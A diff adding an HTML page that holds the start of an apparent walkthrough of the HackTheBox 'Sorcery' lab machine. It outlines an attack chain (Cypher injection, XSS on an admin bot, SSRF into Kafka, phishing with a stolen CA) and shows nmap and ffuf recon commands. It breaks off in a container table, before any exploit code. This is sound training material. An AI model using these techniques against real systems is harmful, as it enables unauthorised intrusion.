@@ -1,0 +1,1563 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- ═══════════════════════════════════════════════
+       EDIT THIS: Page title
+  ═══════════════════════════════════════════════ -->
+  <title>SYSTEM://HTB Sorcery Walkthrough</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Exo+2:ital,wght@0,300;0,400;0,600;1,400&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+
+  <style>
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           DESIGN TOKENS                      ║
+       ╚══════════════════════════════════════════════╝ */
+    :root {
+      /* Core palette */
+      --cp-void:        #05050a;
+      --cp-deep:        #0a0a12;
+      --cp-surface:     #0d0d18;
+      --cp-surface-2:   #12121f;
+      --cp-surface-3:   #181828;
+      --cp-border:      #1e1e35;
+
+      /* Neon accents */
+      --cp-cyan:        #00f5ff;
+      --cp-cyan-dim:    #007a80;
+      --cp-cyan-glow:   rgba(0, 245, 255, 0.25);
+      --cp-cyan-muted:  rgba(0, 245, 255, 0.08);
+
+      --cp-magenta:     #ff0080;
+      --cp-magenta-dim: #7a003d;
+      --cp-magenta-glow: rgba(255, 0, 128, 0.25);
+
+      --cp-green:       #39ff14;
+      --cp-green-dim:   #1a7a08;
+      --cp-green-glow:  rgba(57, 255, 20, 0.2);
+
+      --cp-amber:       #ffb800;
+      --cp-amber-glow:  rgba(255, 184, 0, 0.2);
+
+      /* Text */
+      --cp-text:        #c8d8e8;
+      --cp-text-muted:  #6a7f94;
+      --cp-text-dim:    #3a4f60;
+
+      /* Typography */
+      --font-display: 'Orbitron', 'Courier New', monospace;
+      --font-body:    'Exo 2', 'Segoe UI', sans-serif;
+      --font-mono:    'Share Tech Mono', 'Courier New', monospace;
+
+      /* Spacing — mobile-first (tighter base) */
+      --sp-xs:  0.35rem;
+      --sp-sm:  0.7rem;
+      --sp-md:  1.2rem;
+      --sp-lg:  2rem;
+      --sp-xl:  3rem;
+
+      /* Layout */
+      --max-width:  1000px;
+      --radius:     4px;
+      --radius-lg:  8px;
+      --transition: all 0.2s ease;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           GLOBAL RESET & BASE               ║
+       ╚══════════════════════════════════════════════╝ */
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      background: var(--cp-void);
+      scroll-behavior: smooth;
+    }
+
+    body {
+      background: var(--cp-void);
+      min-height: 100vh;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* CRT scanlines overlay — entire page */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0, 0, 0, 0.07) 2px,
+        rgba(0, 0, 0, 0.07) 4px
+      );
+      pointer-events: none;
+      z-index: 9999;
+    }
+
+    /* Circuit grid background */
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(0,245,255,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,245,255,0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: var(--cp-void); }
+    ::-webkit-scrollbar-thumb {
+      background: var(--cp-cyan-dim);
+      border-radius: 2px;
+    }
+    ::-webkit-scrollbar-thumb:hover { background: var(--cp-cyan); }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           TOP BAR / HEADER                  ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-topbar {
+      position: sticky;
+      top: 0;
+      z-index: 500;
+      width: 100%;
+      background: rgba(5, 5, 10, 0.92);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--cp-cyan-dim);
+      box-shadow: 0 1px 20px var(--cp-cyan-glow);
+      padding: 0.6rem var(--sp-md);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: var(--sp-sm);
+    }
+
+    .cp-topbar-left {
+      display: flex;
+      align-items: center;
+      gap: var(--sp-sm);
+      min-width: 0;
+    }
+
+    /* Blinking status dot */
+    .cp-status-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--cp-green);
+      box-shadow: 0 0 8px var(--cp-green);
+      flex-shrink: 0;
+      animation: blink-dot 2s ease-in-out infinite;
+    }
+
+    @keyframes blink-dot {
+      0%, 100% { opacity: 1; }
+      50%       { opacity: 0.2; }
+    }
+
+    .cp-topbar-brand {
+      font-family: var(--font-display);
+      font-size: clamp(0.7rem, 2.5vw, 0.85rem);
+      font-weight: 900;
+      letter-spacing: 0.15em;
+      color: var(--cp-cyan);
+      text-shadow: 0 0 12px var(--cp-cyan-glow);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .cp-topbar-brand span { color: var(--cp-magenta); }
+
+    /* EDIT: category tag */
+    .cp-topbar-tag {
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      letter-spacing: 0.1em;
+      color: var(--cp-text-dim);
+      border: 1px solid var(--cp-border);
+      padding: 0.15em 0.5em;
+      border-radius: var(--radius);
+      white-space: nowrap;
+      display: none; /* hidden on very small screens */
+    }
+
+    @media (min-width: 400px) {
+      .cp-topbar-tag { display: inline; }
+    }
+
+    .cp-topbar-right {
+      font-family: var(--font-mono);
+      font-size: 0.6rem;
+      color: var(--cp-text-dim);
+      letter-spacing: 0.05em;
+      flex-shrink: 0;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           MAIN CONTENT WRAPPER              ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body {
+      position: relative;
+      z-index: 1;
+      font-family:  var(--font-body);
+      font-size:    clamp(0.95rem, 2.5vw, 1.05rem);
+      line-height:  1.8;
+      color:        var(--cp-text);
+      background:   var(--cp-surface);
+      max-width:    var(--max-width);
+      margin:       0 auto;
+      padding:      var(--sp-lg) var(--sp-md);
+      min-height:   100vh;
+
+      /* Left cyan accent line */
+      border-left:  2px solid var(--cp-cyan-dim);
+      border-right: 2px solid var(--cp-magenta-dim);
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           HEADINGS                          ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body h1, .cp-body h2, .cp-body h3,
+    .cp-body h4, .cp-body h5, .cp-body h6 {
+      font-family:    var(--font-display);
+      line-height:    1.2;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-top:     var(--sp-xl);
+      margin-bottom:  var(--sp-md);
+    }
+
+    /* H1 — Glitch effect */
+    .cp-body h1 {
+      font-size:   clamp(1.6rem, 5vw, 2.8rem);
+      font-weight: 900;
+      color:       var(--cp-cyan);
+      text-shadow:
+        0 0 20px var(--cp-cyan-glow),
+        0 0 60px rgba(0,245,255,0.1);
+      margin-top:  0;
+      position:    relative;
+      padding-bottom: var(--sp-sm);
+    }
+
+    /* Glitch underline bar */
+    .cp-body h1::after {
+      content:  '';
+      display:  block;
+      height:   3px;
+      width:    100%;
+      margin-top: var(--sp-xs);
+      background: linear-gradient(
+        90deg,
+        var(--cp-cyan),
+        var(--cp-magenta) 60%,
+        transparent
+      );
+      animation: glitch-bar 4s ease-in-out infinite;
+    }
+
+    @keyframes glitch-bar {
+      0%, 90%, 100% { transform: scaleX(1); opacity: 1; }
+      92%            { transform: scaleX(0.95) translateX(4px); opacity: 0.8; }
+      94%            { transform: scaleX(1.02) translateX(-3px); opacity: 1; }
+      96%            { transform: scaleX(0.98) translateX(2px); opacity: 0.9; }
+    }
+
+    /* Glitch text flicker on h1 */
+    .cp-body h1 {
+      animation: glitch-text 6s ease-in-out infinite;
+    }
+
+    @keyframes glitch-text {
+      0%, 88%, 100% {
+        text-shadow: 0 0 20px var(--cp-cyan-glow), 0 0 60px rgba(0,245,255,0.1);
+        transform: none;
+      }
+      90% {
+        text-shadow:
+          -3px 0 var(--cp-magenta),
+          3px 0 var(--cp-cyan),
+          0 0 20px var(--cp-cyan-glow);
+        transform: skewX(-1deg);
+      }
+      92% {
+        text-shadow: 0 0 20px var(--cp-cyan-glow);
+        transform: none;
+      }
+      94% {
+        text-shadow:
+          2px 0 var(--cp-magenta),
+          -2px 0 var(--cp-cyan);
+        transform: skewX(0.5deg);
+      }
+    }
+
+    /* H2 */
+    .cp-body h2 {
+      font-size:  clamp(1.2rem, 3.5vw, 1.8rem);
+      color:      var(--cp-cyan);
+      position:   relative;
+      padding:    var(--sp-sm) var(--sp-md);
+      background: var(--cp-cyan-muted);
+      border-left: 3px solid var(--cp-cyan);
+      border-radius: 0 var(--radius) var(--radius) 0;
+    }
+
+    .cp-body h2::before {
+      content:     '// ';
+      color:       var(--cp-cyan-dim);
+      font-family: var(--font-mono);
+      font-size:   0.8em;
+    }
+
+    /* H3 */
+    .cp-body h3 {
+      font-size: clamp(1rem, 3vw, 1.4rem);
+      color:     var(--cp-magenta);
+      text-shadow: 0 0 12px var(--cp-magenta-glow);
+    }
+
+    .cp-body h3::before {
+      content:     '> ';
+      font-family: var(--font-mono);
+      color:       var(--cp-magenta-dim);
+      font-size:   0.9em;
+    }
+
+    /* H4–H6 */
+    .cp-body h4 {
+      font-size: 1.05rem;
+      color:     var(--cp-amber);
+      letter-spacing: 0.1em;
+    }
+    .cp-body h4::before { content: '## '; font-family: var(--font-mono); color: var(--cp-text-dim); font-size: 0.8em; }
+
+    .cp-body h5 { font-size: 0.95rem; color: var(--cp-text); }
+    .cp-body h6 { font-size: 0.85rem; color: var(--cp-text-muted); }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           PARAGRAPHS & INLINE               ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body p {
+      margin-bottom: var(--sp-md);
+      font-weight:   300;
+      color:         var(--cp-text);
+    }
+
+    .cp-body p:last-child { margin-bottom: 0; }
+
+    .cp-body strong, .cp-body b {
+      color:       var(--cp-cyan);
+      font-weight: 600;
+    }
+
+    .cp-body em, .cp-body i {
+      color:      var(--cp-text-muted);
+      font-style: italic;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           LINKS                             ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body a {
+      color:           var(--cp-cyan);
+      text-decoration: none;
+      border-bottom:   1px dashed var(--cp-cyan-dim);
+      transition:      var(--transition);
+      font-weight:     600;
+      font-family:     var(--font-mono);
+      font-size:       0.95em;
+    }
+
+    .cp-body a:hover {
+      color:        var(--cp-cyan);
+      border-color: var(--cp-cyan);
+      text-shadow:  0 0 10px var(--cp-cyan-glow);
+      background:   var(--cp-cyan-muted);
+      padding:      0 0.2em;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           HORIZONTAL RULE                   ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body hr {
+      border: none;
+      height: 1px;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        var(--cp-magenta),
+        var(--cp-cyan),
+        transparent
+      );
+      margin: var(--sp-xl) 0;
+      position: relative;
+    }
+
+    .cp-body hr::before {
+      content:    '◈';
+      position:   absolute;
+      left:       50%;
+      top:        50%;
+      transform:  translate(-50%, -50%);
+      color:      var(--cp-cyan);
+      font-size:  0.9rem;
+      background: var(--cp-surface);
+      padding:    0 var(--sp-sm);
+      text-shadow: 0 0 10px var(--cp-cyan-glow);
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           BLOCKQUOTE                        ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body blockquote {
+      position:     relative;
+      margin:       var(--sp-lg) 0;
+      padding:      var(--sp-md) var(--sp-lg);
+      background:   rgba(255, 0, 128, 0.05);
+      border-left:  3px solid var(--cp-magenta);
+      border-radius: 0 var(--radius) var(--radius) 0;
+      color:        var(--cp-text-muted);
+      font-style:   italic;
+
+      /* Corner brackets */
+      outline: 1px solid rgba(255, 0, 128, 0.15);
+    }
+
+    /* Top-right corner bracket */
+    .cp-body blockquote::before {
+      content:    '⌝';
+      position:   absolute;
+      top:        -0.6rem;
+      right:      0.5rem;
+      font-size:  1.8rem;
+      color:      var(--cp-magenta);
+      opacity:    0.5;
+      line-height: 1;
+    }
+
+    .cp-body blockquote::after {
+      content:    '⌞';
+      position:   absolute;
+      bottom:     -0.8rem;
+      left:       0.5rem;
+      font-size:  1.8rem;
+      color:      var(--cp-magenta);
+      opacity:    0.5;
+      line-height: 1;
+    }
+
+    .cp-body blockquote p { margin: 0; }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           LISTS                             ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body ul, .cp-body ol {
+      margin:       var(--sp-md) 0;
+      padding-left: var(--sp-lg);
+    }
+
+    .cp-body li { margin-bottom: var(--sp-xs); }
+
+    /* Unordered */
+    .cp-body ul { list-style: none; padding-left: var(--sp-md); }
+
+    .cp-body ul > li {
+      position:    relative;
+      padding-left: var(--sp-lg);
+    }
+
+    .cp-body ul > li::before {
+      content:   '▶';
+      position:  absolute;
+      left:      0;
+      color:     var(--cp-cyan);
+      font-size: 0.55em;
+      top:       0.45em;
+      text-shadow: 0 0 6px var(--cp-cyan-glow);
+    }
+
+    .cp-body ul ul > li::before {
+      content: '◈';
+      color:   var(--cp-magenta);
+      font-size: 0.5em;
+      top: 0.5em;
+    }
+
+    .cp-body ul ul ul > li::before {
+      content: '─';
+      color:   var(--cp-text-dim);
+      font-size: 0.8em;
+    }
+
+    /* Ordered */
+    .cp-body ol { list-style: decimal; }
+    .cp-body ol li::marker {
+      color:       var(--cp-cyan);
+      font-family: var(--font-mono);
+      font-size:   0.9em;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           CODE                              ║
+       ╚══════════════════════════════════════════════╝ */
+
+    /* Inline code */
+    .cp-body code {
+      font-family:  var(--font-mono);
+      font-size:    0.88em;
+      color:        var(--cp-green);
+      background:   rgba(57, 255, 20, 0.07);
+      border:       1px solid var(--cp-green-dim);
+      padding:      0.1em 0.4em;
+      border-radius: var(--radius);
+      white-space:  nowrap;
+      text-shadow:  0 0 6px var(--cp-green-glow);
+    }
+
+    /* Code block */
+    .cp-body pre {
+      background:    var(--cp-surface-2);
+      border:        1px solid var(--cp-border);
+      border-top:    2px solid var(--cp-cyan);
+      border-radius: var(--radius-lg);
+      padding:       var(--sp-lg);
+      overflow-x:    auto;
+      margin:        var(--sp-lg) 0;
+      position:      relative;
+      box-shadow:
+        0 0 0 1px rgba(0,245,255,0.05),
+        0 8px 32px rgba(0,0,0,0.6),
+        inset 0 1px 0 rgba(0,245,255,0.08);
+
+      /* Subtle glow around the block */
+      filter: drop-shadow(0 0 8px rgba(0,245,255,0.05));
+    }
+
+    /* Terminal header bar */
+    .cp-body pre::before {
+      content:     'TERMINAL://EXEC';
+      display:     block;
+      font-family: var(--font-mono);
+      font-size:   0.6rem;
+      letter-spacing: 0.2em;
+      color:       var(--cp-cyan-dim);
+      margin-bottom: var(--sp-sm);
+      padding-bottom: var(--sp-sm);
+      border-bottom: 1px solid var(--cp-border);
+    }
+
+    .cp-body pre code {
+      background:  transparent;
+      border:      none;
+      padding:     0;
+      color:       var(--cp-green);
+      font-size:   0.9rem;
+      line-height: 1.7;
+      white-space: pre;
+      text-shadow: 0 0 4px var(--cp-green-glow);
+    }
+
+    /* Blinking cursor at end of code blocks */
+    .cp-body pre::after {
+      content:    '█';
+      color:      var(--cp-cyan);
+      font-family: var(--font-mono);
+      font-size:   0.85rem;
+      display:    inline-block;
+      animation:  cursor-blink 1.1s step-end infinite;
+      margin-left: 2px;
+      opacity:    0.7;
+    }
+
+    @keyframes cursor-blink {
+      0%, 100% { opacity: 0.7; }
+      50%       { opacity: 0; }
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           TABLES                            ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body table {
+      width:           100%;
+      border-collapse: collapse;
+      margin:          var(--sp-lg) 0;
+      font-size:       0.9rem;
+      font-family:     var(--font-mono);
+      border:          1px solid var(--cp-border);
+      border-radius:   var(--radius-lg);
+      overflow:        hidden;
+      box-shadow:      0 0 20px rgba(0,245,255,0.05);
+    }
+
+    .cp-body thead {
+      background: linear-gradient(135deg, #0a1520, #0d1a2a);
+      border-bottom: 2px solid var(--cp-cyan);
+    }
+
+    .cp-body thead th {
+      font-family:    var(--font-display);
+      font-size:      0.7rem;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color:          var(--cp-cyan);
+      padding:        var(--sp-sm) var(--sp-md);
+      text-align:     left;
+      text-shadow:    0 0 8px var(--cp-cyan-glow);
+    }
+
+    .cp-body tbody tr {
+      background:  var(--cp-surface-2);
+      transition:  var(--transition);
+      border-bottom: 1px solid var(--cp-border);
+    }
+
+    .cp-body tbody tr:nth-child(even) {
+      background: var(--cp-surface-3);
+    }
+
+    .cp-body tbody tr:hover {
+      background:  rgba(0, 245, 255, 0.05);
+      box-shadow:  inset 3px 0 0 var(--cp-cyan);
+    }
+
+    .cp-body td {
+      padding:       var(--sp-sm) var(--sp-md);
+      color:         var(--cp-text);
+      vertical-align: top;
+    }
+
+    /* Mobile table scroll */
+    @media (max-width: 520px) {
+      .cp-body table { display: block; overflow-x: auto; }
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           IMAGES                            ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body img {
+      max-width:    100%;
+      height:       auto;
+      display:      block;
+      border-radius: var(--radius-lg);
+      margin:       var(--sp-lg) auto;
+      border:       1px solid var(--cp-border);
+      box-shadow:
+        0 0 0 1px var(--cp-cyan-dim),
+        0 8px 40px rgba(0,0,0,0.7),
+        0 0 20px rgba(0,245,255,0.05);
+      transition:   var(--transition);
+      filter:       saturate(0.85);
+    }
+
+    .cp-body img:hover {
+      border-color: var(--cp-cyan);
+      box-shadow:
+        0 0 0 1px var(--cp-cyan),
+        0 12px 60px rgba(0,0,0,0.8),
+        0 0 30px var(--cp-cyan-glow);
+      filter:     saturate(1.1);
+      transform:  scale(1.01);
+    }
+
+    .cp-body figcaption {
+      text-align:    center;
+      font-size:     0.78rem;
+      font-family:   var(--font-mono);
+      color:         var(--cp-text-dim);
+      margin-top:    calc(-1 * var(--sp-sm));
+      margin-bottom: var(--sp-lg);
+      letter-spacing: 0.05em;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           MISC INLINE ELEMENTS              ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body kbd {
+      font-family:   var(--font-mono);
+      font-size:     0.8em;
+      color:         var(--cp-cyan);
+      background:    var(--cp-surface-3);
+      border:        1px solid var(--cp-cyan-dim);
+      border-bottom: 2px solid var(--cp-cyan-dim);
+      border-radius: var(--radius);
+      padding:       0.1em 0.5em;
+      text-shadow:   0 0 6px var(--cp-cyan-glow);
+    }
+
+    .cp-body mark {
+      background:    rgba(255, 184, 0, 0.15);
+      color:         var(--cp-amber);
+      border-radius: 2px;
+      padding:       0.05em 0.3em;
+      font-family:   var(--font-mono);
+      font-size:     0.9em;
+    }
+
+    .cp-body abbr[title] {
+      color:          var(--cp-cyan);
+      text-decoration: underline dotted var(--cp-cyan-dim);
+      cursor:         help;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           DETAILS / SUMMARY                 ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body details {
+      background:    var(--cp-surface-2);
+      border:        1px solid var(--cp-border);
+      border-left:   2px solid var(--cp-cyan-dim);
+      border-radius: var(--radius-lg);
+      padding:       var(--sp-md);
+      margin:        var(--sp-md) 0;
+      transition:    border-color 0.2s;
+    }
+
+    .cp-body details[open] {
+      border-left-color: var(--cp-cyan);
+      box-shadow: inset 0 0 20px rgba(0,245,255,0.03);
+    }
+
+    .cp-body summary {
+      font-family:    var(--font-display);
+      font-size:      0.85rem;
+      letter-spacing: 0.1em;
+      color:          var(--cp-cyan);
+      cursor:         pointer;
+      user-select:    none;
+      list-style:     none;
+      display:        flex;
+      align-items:    center;
+      gap:            var(--sp-sm);
+      text-transform: uppercase;
+    }
+
+    .cp-body summary::before {
+      content:    '▶';
+      font-size:  0.65em;
+      transition: transform 0.2s ease;
+      color:      var(--cp-cyan-dim);
+    }
+
+    .cp-body details[open] > summary::before {
+      transform: rotate(90deg);
+      color:     var(--cp-cyan);
+    }
+
+    .cp-body details > *:not(summary) {
+      margin-top: var(--sp-md);
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           SELECTION                         ║
+       ╚══════════════════════════════════════════════╝ */
+    ::selection {
+      background: rgba(0, 245, 255, 0.2);
+      color:      var(--cp-cyan);
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           FOOTER                            ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-footer {
+      position:   relative;
+      z-index:    1;
+      max-width:  var(--max-width);
+      margin:     0 auto;
+      padding:    var(--sp-md);
+      border-top: 1px solid var(--cp-border);
+      display:    flex;
+      flex-wrap:  wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap:        var(--sp-sm);
+      font-family: var(--font-mono);
+      font-size:  0.65rem;
+      letter-spacing: 0.08em;
+      color:      var(--cp-text-dim);
+      text-transform: uppercase;
+    }
+
+    .cp-footer a {
+      color:      var(--cp-cyan-dim);
+      text-decoration: none;
+      border:     none;
+      font-family: var(--font-mono);
+      transition: var(--transition);
+    }
+
+    .cp-footer a:hover {
+      color:      var(--cp-cyan);
+      text-shadow: 0 0 8px var(--cp-cyan-glow);
+    }
+
+    .cp-footer-sig {
+      color: var(--cp-text-dim);
+      font-size: 0.6rem;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           RESPONSIVE BREAKPOINTS            ║
+       ╚══════════════════════════════════════════════╝ */
+
+    /* Small phones */
+    @media (max-width: 380px) {
+      .cp-body {
+        padding:   var(--sp-md) var(--sp-sm);
+        font-size: 0.9rem;
+        border-left-width: 1px;
+        border-right-width: 1px;
+      }
+      .cp-body h1 { font-size: 1.4rem; }
+      .cp-body h2 { font-size: 1.1rem; }
+      .cp-body h3 { font-size: 1rem; }
+      .cp-body pre { padding: var(--sp-md) var(--sp-sm); font-size: 0.78rem; }
+    }
+
+    /* Tablets and up */
+    @media (min-width: 768px) {
+      .cp-body {
+        padding:   var(--sp-xl) var(--sp-lg);
+        font-size: 1.05rem;
+      }
+      :root {
+        --sp-md: 1.4rem;
+        --sp-lg: 2.4rem;
+        --sp-xl: 3.4rem;
+      }
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           PRINT                             ║
+       ╚══════════════════════════════════════════════╝ */
+    @media print {
+      body::before, body::after { display: none; }
+      .cp-topbar, .cp-footer    { display: none; }
+      .cp-body {
+        background: #fff;
+        color: #111;
+        border: none;
+        max-width: 100%;
+      }
+      .cp-body h1,.cp-body h2,.cp-body h3 { color: #000; text-shadow: none; animation: none; }
+      .cp-body a { color: #000; border-bottom: 1px solid #000; }
+      .cp-body pre, .cp-body code { background: #f0f0f0; color: #111; text-shadow: none; }
+    }
+
+  </style>
+</head>
+<body>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       TOP BAR
+       EDIT: .cp-topbar-brand  → your site name
+             .cp-topbar-tag    → your category
+  ═══════════════════════════════════════════════════════════ -->
+  <header class="cp-topbar">
+    <div class="cp-topbar-left">
+      <div class="cp-status-dot"></div>
+      <span class="cp-topbar-brand"><span>M</span>NOTES<span>//</span>SEC</span>
+      <span class="cp-topbar-tag">CYBER · LABS · INTEL</span>
+    </div>
+    <div class="cp-topbar-right" id="cp-clock">SYSTEM ONLINE</div>
+  </header>
+
+
+  <!-- ═══════════════════════════════════════════════════════════
+       CONTENT ZONE
+       PASTE your markdown-converted HTML between the markers.
+       Keep <main class="cp-body"> — it applies all styles.
+  ═══════════════════════════════════════════════════════════ -->
+  <main class="cp-body">
+<h1>HTB: Sorcery </h1>
+<blockquote>
+<p><strong>Difficulty:</strong> Insane | <strong>OS:</strong> Linux (Ubuntu 24.04) | <strong>Released:</strong> 14 Jun 2025 | <strong>Retired:</strong> 25 Apr 2026 <strong>Creator:</strong> tomadimitrie</p>
+</blockquote>
+<hr>
+<h2>HTB Sorcery Summary</h2>
+<p>Sorcery is an Insane-rated Linux box running a Rust Rocket web application backed by Neo4j, Gitea, and a Kafka message bus, all orchestrated through Docker Compose. The full attack chain is:</p>
+<ol>
+<li>Enumerate subdomains → find <code>git.sorcery.htb</code> running Gitea with a public source code repo</li>
+<li>Exploit <strong>Cypher injection</strong> in a derive-macro-generated Neo4j query to leak the <code>Config</code> node&#39;s registration key → register as Seller</li>
+<li>Exploit <strong>stored XSS</strong> in a product description rendered by a headless Chrome admin bot → use the bot&#39;s scoped admin JWT to register an attacker-controlled passkey on the admin account</li>
+<li>Log in as admin with the registered passkey → access the port debug tool</li>
+<li>Abuse the debug tool as an <strong>SSRF primitive</strong> to send <strong>Kafka wire protocol</strong> messages directly to the broker → inject a command into the DNS container&#39;s <code>update</code> topic → <strong>RCE inside the DNS container</strong></li>
+<li>Recover the Root CA keypair from the anonymous FTP server → use it to <strong>phish <code>tom_summers</code></strong> with <code>mitmproxy</code> serving a fake Gitea login → capture credentials</li>
+<li>SSH as <code>tom_summers</code> → read a password from an <strong>Xvfb framebuffer</strong> dump → pivot to next user</li>
+<li>Reverse a <strong>.NET TOTP binary</strong> to predict OTPs → authenticate to an internal Docker Registry → pull a pushed image → extract a password from image layers</li>
+<li>Use <strong>FreeIPA / LDAP</strong> role manipulation to change a user&#39;s password → bootstrap sudo rights → root</li>
+</ol>
+<hr>
+<h2>01 · Recon</h2>
+<h3>Nmap</h3>
+<pre><code class="language-bash">sudo nmap -p- -vvv --min-rate 10000 10.129.25.147
+sudo nmap -p 22,443 -sCV 10.129.25.147
+</code></pre>
+<p><strong>Open ports:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 9.6p1 Ubuntu → Ubuntu 24.04 noble</td>
+</tr>
+<tr>
+<td>443</td>
+<td>HTTPS</td>
+<td>nginx/1.27.1 — redirects to <code>sorcery.htb</code></td>
+</tr>
+</tbody></table>
+<p><strong>Container indicator:</strong> <code>lft</code> (layer-4 traceroute) shows an extra hop to reach port 443 vs port 22, indicating the web server runs inside a container behind the host&#39;s network stack.</p>
+<p>The TLS certificate is valid until 2052 with <code>CN=sorcery.htb</code>, indicating a self-signed CA.</p>
+<pre><code class="language-bash">echo &quot;10.129.25.147 sorcery.htb git.sorcery.htb&quot; | sudo tee -a /etc/hosts
+</code></pre>
+<h3>Subdomain Enumeration</h3>
+<pre><code class="language-bash">ffuf -u https://10.129.25.147 -H &quot;Host: FUZZ.sorcery.htb&quot; \
+  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
+# Finds: git [Status: 200, Size: 13592]
+</code></pre>
+<p><code>git.sorcery.htb</code> is a Gitea 1.22.1 instance with one public repo: <code>nicole_sullivan/infrastructure</code>.</p>
+<h3>Clone the Repo</h3>
+<pre><code class="language-bash">GIT_SSL_NO_VERIFY=1 git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
+cd infrastructure/
+ls
+# backend  backend-macros  dns  docker-compose.yml  frontend
+</code></pre>
+<p>Single commit (<code>Final version</code>) by <code>nicole_sullivan@sorcery.htb</code> — reveals the email/username format <code>&lt;first&gt;_&lt;last&gt;</code>.</p>
+<hr>
+<h2>02 · Source Code Analysis : docker-compose.yml</h2>
+<p>The compose file defines 10 containers. Only <code>nginx</code> exposes a port to the host (<code>443:443</code>).</p>
+<table>
+<thead>
+<tr>
+<th>Container</th>
+<th>Image / Build</th>
+<th>Key Details</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>backend</code></td>
+<td><code>./backend/Dockerfile</code></td>
+<td>Rust Rocket app; waits for <code>neo4j:7687</code>, <code>kafka:9092</code>; listens on 8000</td>
+</tr>
+<tr>
+<td><code>frontend</code></td>
+<td><code>./frontend/Dockerfile</code></td>
+<td>Next.js app; waits for <code>backend:8000</code>; listens on 3000</td>
+</tr>
+<tr>
+<td><code>neo4j</code></td>
+<td><code>neo4j:5.23.0-community-bullseye</code></td>
+<td>Graph DB; listens on 7687 (Bolt)</td>
+</tr>
+<tr>
+<td><code>kafka</code></td>
+<td><code>./kafka/Dockerfile</code></td>
+<td>Apache Kafka KRaft mode; broker on 9092, controller on 9093</td>
+</tr>
+<tr>
+<td><code>dns</code></td>
+<td><code>./dns/</code> (in repo)</td>
+<td>dnsmasq + Rust consumer; subscribes to Kafka topic <code>update</code></td>
+</tr>
+<tr>
+<td><code>mail</code></td>
+<td><code>mailhog/mailhog:v1.0.1</code></td>
+<td>Dev SMTP — captures all outbound mail; web UI on 8025</td>
+</tr>
+<tr>
+<td><code>ftp</code></td>
+<td><code>million12/vsftpd</code></td>
+<td>Anonymous access enabled; <strong>mounts <code>RootCA.crt</code> and <code>RootCA.key</code></strong> from <code>./certificates/generated/</code></td>
+</tr>
+<tr>
+<td><code>gitea</code></td>
+<td><code>./gitea/Dockerfile</code></td>
+<td>Self-hosted Git; registration disabled; listens on 3000</td>
+</tr>
+<tr>
+<td><code>mail_bot</code></td>
+<td><code>./mail_bot/</code></td>
+<td>Polls MailHog; follows links matching <code>EXPECTED_DOMAIN</code>; submits <code>PHISHING_USERNAME</code>/<code>PHISHING_PASSWORD</code> to login forms</td>
+</tr>
+<tr>
+<td><code>nginx</code></td>
+<td><code>./nginx/</code></td>
